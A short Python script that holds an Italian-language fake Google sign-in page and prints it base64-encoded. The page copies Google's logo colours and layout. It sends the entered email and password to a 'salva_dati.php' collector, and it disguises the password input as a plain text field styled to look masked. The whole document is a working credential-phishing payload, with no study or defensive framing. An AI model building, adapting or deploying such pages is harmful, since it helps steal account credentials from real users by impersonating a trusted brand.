html_payload = """<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accedi - Account Google</title>
    <style>
        body { font-family: arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f7f8f8; margin: 0; }
        .login-box { background: white; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; width: 360px; text-align: center; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 15px; color: #202124; }
        p { margin-bottom: 25px; color: #202124; font-size: 16px; }
        input[type="email"], input[type="text"].pwd { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input[type="text"].pwd { -webkit-text-security: disc; text-security: disc; font-family: text-security, sans-serif; }
        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; font-size: 14px; }
        .google-text { font-size: 24px; font-weight: bold; margin-bottom: 20px; display: block; }
        .blue { color: #4285F4; } .red { color: #EA4335; } .yellow { color: #FBBC05; } .green { color: #34A853; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="google-text">
            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
        </div>
        <h1>Accedi</h1>
        <p>Utilizza il tuo Account Google</p>
        <form action="/salva_dati.php" method="POST">
            <input type="email" name="email" placeholder="Indirizzo email o numero di telefono" required>
            <input type="text" name="password" class="pwd" placeholder="Inserisci la tua password" required style="-webkit-text-security: disc;">
            <div style="text-align: left; color: #1a73e8; font-size: 14px; margin-bottom: 20px; cursor: pointer;">
                Password dimenticata?
            </div>
            <button type="submit" class="btn">Avanti</button>
        </form>
    </div>
</body>
</html>"""
import base64
print(base64.b64encode(html_payload.encode('utf-8')).decode('utf-8'))
